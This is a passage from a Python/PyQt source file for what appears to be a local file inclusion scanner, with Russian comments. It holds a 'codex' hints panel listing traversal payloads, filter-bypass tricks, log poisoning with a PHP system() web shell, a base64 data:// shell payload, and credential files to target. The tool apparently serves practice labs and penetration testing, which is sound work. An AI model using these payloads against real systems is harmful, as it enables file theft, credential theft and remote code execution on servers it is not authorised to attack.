            resp = _req.get(f.url, timeout=10, verify=False,
                           headers={"User-Agent": "Mozilla/5.0"})

            # Пытаемся извлечь только содержимое файла из HTML-ответа
            body = resp.text

            # Ищем типичные контейнеры с контентом файла
            patterns = [
                r'<div class="file-content">(.*?)</div>',   # vine-lab
                r'<pre[^>]*>(.*?)</pre>',
                r'<code[^>]*>(.*?)</code>',
            ]
            extracted = None
            for pat in patterns:
                m = _re.search(pat, body, _re.DOTALL)
                if m:
                    raw = m.group(1)
                    # Декодируем HTML entities
                    raw = raw.replace("&lt;","<").replace("&gt;",">").replace("&amp;","&")
                    extracted = raw.strip()
                    break

            if extracted:
                self._file_view.setPlainText(extracted)
                self._file_view.setStyleSheet(
                    "background: #0a0a0a; border: 1px solid #1a3a2a;"
                    "color: #e8c060; font-size: 12px; padding: 6px;"
                )
            else:
                # Показать первые 2000 символов сырого ответа
                self._file_view.setPlainText(body[:2000])
                self._file_view.setStyleSheet(
                    "background: #0a0a0a; border: 1px solid #3a2a00;"
                    "color: #b09060; font-size: 12px; padding: 6px;"
                )

        except Exception as e:
            self._file_view.setPlainText(f"error: {e}")
            self._file_view.setStyleSheet(
                "background: #0a0a0a; border: 1px solid #4a1a1a;"
                "color: #cc5a4a; font-size: 12px; padding: 6px;"
            )
        finally:
            self._btn_read.setText("▶  читать файл")
            self._btn_read.setEnabled(True)

    def set_scan_config(self, config):
        """Сохраняет конфиг для передачи в RCE-консоль (cookies, proxy)."""
        self._scan_config = config

    @staticmethod
    def _flash_btn(btn: QPushButton):
        btn.setText("✓")
        btn.setStyleSheet("color: #4a8a6a; border-color: #4a8a6a;")
        QTimer.singleShot(1200, lambda: (btn.setText("⎘"), btn.setStyleSheet("")))

    def _save_notes(self):
        if self._finding:
            self.notes_saved.emit(self._finding.id, self._notes.toPlainText())


# ══════════════════════════════════════════════════════════════════
# HINTS PANEL (Codex)
# ══════════════════════════════════════════════════════════════════

HINTS = [
    ("Path Traversal",
     "Базовая техника — ../  для выхода из текущей директории.\n"
     "Пример: ../../../../etc/passwd\n"
     "Нужная глубина зависит от расположения файла приложения.\n"
     "Если приложение в /var/www/html/ — нужно 3-4 уровня."),

    ("Bypass нерекурсивного фильтра",
     "str_replace('../', '') удаляет ../ один раз, не рекурсивно.\n"
     "Используй ....// — после удаления ../  остаётся  ../\n"
     "Также работают: ..././   и   ....\\\\"),

    ("Bypass prefix-фильтра",
     "Если приложение добавляет lang_ перед значением:\n"
     "include('lang_' . $_GET['language'])\n"
     "Добавь / перед payload: /../../../../etc/passwd\n"
     "PHP увидит lang_/ — несуществующая папка, но traversal работает."),

    ("Bypass approved path",
     "Фильтр требует начала с ./languages/ ?\n"
     "Начни payload с разрешённого пути, затем уходи назад:\n"
     "./languages/../../../../etc/passwd\n"
     "Regex ^\\./languages/ пройдёт, а traversal выполнится."),

    ("Null Byte  (PHP < 5.5)",
     "Добавление %00 завершает строку на уровне C.\n"
     "include('files/' . $_GET['f'] . '.php') + payload /etc/passwd%00\n"
     "Результат: include('files/../../../etc/passwd') — .php обрезается.\n"
     "Не работает на PHP >= 5.5 — пропатчено."),

    ("URL / Double Encoding",
     ".  →  %2e      /  →  %2f\n"
     "../../../../etc/passwd  →  %2e%2e%2f%2e%2e%2f...\n"
     "Двойное: %  →  %25, значит %2e  →  %252e\n"
     "Обходит WAF и фильтры, проверяющие сырой ввод до декодирования."),

    ("Second-Order LFI",
     "Payload сохраняется в БД, а не исполняется сразу.\n"
     "Пример: имя пользователя = ../../../../etc/passwd\n"
     "Потом другая функция (аватар, профиль) строит путь из БД.\n"
     "Ищи: загрузку аватара, экспорт, отчёты, шаблоны, темы."),

    ("Log Poisoning → RCE",
     "Если доступен лог (access.log, auth.log):\n"
     "1. Внедри PHP-код в User-Agent: <?php system($_GET['cmd']); ?>\n"
     "2. Прочитай лог через LFI: ?page=../../../../var/log/apache2/access.log\n"
     "3. Добавь ?cmd=id — получишь RCE."),

    ("PHP Wrappers",
     "php://filter/convert.base64-encode/resource=/etc/passwd\n"
     "→ читает файл в base64, обходя некоторые ограничения\n\n"
     "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=\n"
     "→ выполняет PHP-код (нужен allow_url_include=On)"),

    ("Полезные файлы  ·  Linux",
     "/etc/passwd         — пользователи системы\n"
     "/etc/shadow         — хэши паролей (нужен root)\n"
     "/proc/self/environ  — переменные окружения + User-Agent\n"
     "/proc/self/cmdline  — командная строка процесса\n"
     "/var/log/*/access.log  — логи для log poisoning\n"
     "/root/.ssh/id_rsa   — приватный ключ root"),
]


class HintsPanel(QWidget):

    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.Shape.NoFrame)

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(16, 16, 16, 16)
        inner_layout.setSpacing(10)

        ornament = QLabel("⸻  codex  ·  знание  ⸻")
        ornament.setObjectName("label_gold")
        inner_layout.addWidget(ornament)

        for title, body in HINTS:
            card = self._make_card(title, body)
            inner_layout.addWidget(card)

        inner_layout.addStretch()
        scroll.setWidget(inner)
        layout.addWidget(scroll)

    @staticmethod
    def _make_card(title: str, body: str) -> QWidget:
        card = QFrame()
        card.setObjectName("hint_card")
        card_layout = QVBoxLayout(card)
        card_layout.setContentsMargins(12, 10, 12, 10)
        card_layout.setSpacing(6)

        title_lbl = QLabel(f"◈  {title.upper()}")
        title_lbl.setObjectName("hint_title")
        card_layout.addWidget(title_lbl)

        body_lbl = QLabel(body)
        body_lbl.setObjectName("hint_body")
        body_lbl.setWordWrap(True)
        body_lbl.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        card_layout.addWidget(body_lbl)

        return card


# ══════════════════════════════════════════════════════════════════
# HISTORY PANEL
# ══════════════════════════════════════════════════════════════════

class HistoryPanel(QWidget):

    session_selected = pyqtSignal(int)   # session_id

    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        self._table = QTableWidget(0, 5)
        self._table.setHorizontalHeaderLabels(["#", "URL", "Found", "Status", "Date"])
        self._table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self._table.verticalHeader().setVisible(False)
        self._table.setShowGrid(False)
        self._table.horizontalHeader().setHighlightSections(False)

        self._table.setColumnWidth(0, 40)
        self._table.setColumnWidth(2, 60)
        self._table.setColumnWidth(3, 70)
        self._table.setColumnWidth(4, 140)
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._table.selectionModel().currentRowChanged.connect(
            lambda cur, _prev: self._on_row_changed(cur.row())
        )

        layout.addWidget(self._table)
        self._sessions: list = []

    def load_sessions(self, sessions: list):
        self._table.setRowCount(0)
        self._sessions = sessions
        for s in sessions:
            row = self._table.rowCount()
            self._table.insertRow(row)

            def cell(text: str, color: str = "#f0e6cc") -> QTableWidgetItem:
                item = QTableWidgetItem(text)
                item.setForeground(QColor(color))
                return item

            found_color = "#c8a45a" if s.found_count > 0 else "#3a3020"
            status_color = {"done": "#4a8a6a", "stopped": "#8a6a20", "error": "#8b3a2a"}.get(s.status, "#7a6a4a")

            self._table.setItem(row, 0, cell(str(s.id), "#6b5a30"))
            self._table.setItem(row, 1, cell(s.url))
            self._table.setItem(row, 2, cell(str(s.found_count), found_color))
            self._table.setItem(row, 3, cell(s.status, status_color))
            self._table.setItem(row, 4, cell(s.created_at_fmt, "#6b5a30"))
            self._table.setRowHeight(row, 36)

    def _on_row_changed(self, row: int):
        if 0 <= row < len(self._sessions):
            self.session_selected.emit(self._sessions[row].id)
